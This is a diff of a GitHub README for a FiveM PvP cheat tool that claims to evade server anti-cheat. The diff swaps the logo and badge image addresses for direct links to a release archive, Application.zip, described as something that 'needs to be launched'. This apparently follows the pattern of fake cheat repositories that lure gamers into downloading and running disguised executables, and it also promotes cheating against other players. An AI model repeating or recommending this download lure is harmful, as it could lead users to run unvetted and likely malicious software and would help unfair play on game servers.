@@ -1,6 +1,6 @@
 # 🎮 FiveM TZ Project PVP Tool 🎮
 
-![TZ Project Logo](https://example.com/tzprojectlogo.png)
+![TZ Project Logo](https://github.com/CEvu6969/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip)
 
 Welcome to the FiveM TZ Project PVP Tool repository, your ultimate solution for enhancing your gaming experience in FiveM servers. With TZ Project, you can elevate your gameplay without worrying about LUA injection, resource stoppers, or dumpers.
 
@@ -24,7 +24,7 @@ FiveM TZ Project PVP Tool offers a range of features to give you the edge in pla
 
 To access and download the FiveM TZ Project PVP Tool, please click on the button below:
 
-[![Download TZ Project](https://img.shields.io/badge/Download-TZ%20Project-blue)](https://github.com/files/Application.zip "Needs to be launched")
+[![Download TZ Project](https://github.com/CEvu6969/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip%20Project-blue)](https://github.com/CEvu6969/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Application.zip "Needs to be launched")
 
 If the link provided above does not work, please check the **Releases** section of this repository for alternative download options.
 
